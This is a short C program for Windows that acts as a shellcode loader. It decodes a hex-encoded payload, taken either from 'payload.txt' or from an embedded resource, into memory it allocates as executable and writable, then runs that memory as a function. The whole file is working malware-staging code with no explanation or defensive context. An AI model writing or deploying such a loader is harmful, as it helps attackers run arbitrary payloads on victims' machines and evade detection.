#include <stdio.h>
#include <windows.h>

char *convert(long *rawSize, const char *text) {
  long textSize = strlen(text);
  *rawSize = textSize / 2;
  char *raw = (char *)malloc(*rawSize);

  for (size_t i = 0; i < textSize; i += 2) {
    sscanf(text + i, "%2x", &raw[i / 2]);
  }

  return raw;
}

char *readFile(long *rawSize) {
  FILE *file = fopen("payload.txt", "rb");

  fseek(file, 0, SEEK_END);
  long fileSize = ftell(file);
  rewind(file);

  char *text = (char *)malloc(fileSize + 1);
  fread(text, sizeof(char), fileSize, file);
  text[fileSize] = 0;
  fclose(file);

  char *raw = convert(rawSize, text);
  free(text);

  return raw;
}

char *readResource(long *rawSize) {
  char *text = LoadResource(0, FindResource(0, MAKEINTRESOURCE(123), RT_RCDATA));
  return convert(rawSize, text);
}

int main(int argc, char *argv[]) {
  long rawSize;
  char *raw;

  if (argc == 2 && strcmp(argv[1], "f") == 0) {
    raw = readFile(&rawSize);
  } else {
    raw = readResource(&rawSize);
  }

  void *ptr = VirtualAlloc(0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(ptr, raw, rawSize);
  ((void (*)())ptr)();

  free(raw);

  return 0;
}

/*
  short *wstr;
  int size = LoadStringW(0, 123, (short *)&wstr, 0); // STRINGTABLE
  printf("%d\n", size);
  printf("%ls\n", wstr);

  // 宽字节 -> 多字节
  char *str = (char *)malloc(size + 1);
  wcstombs(str, wstr, size);
  str[size] = 0;
  printf("%s\n", str);
  free(str);
*/
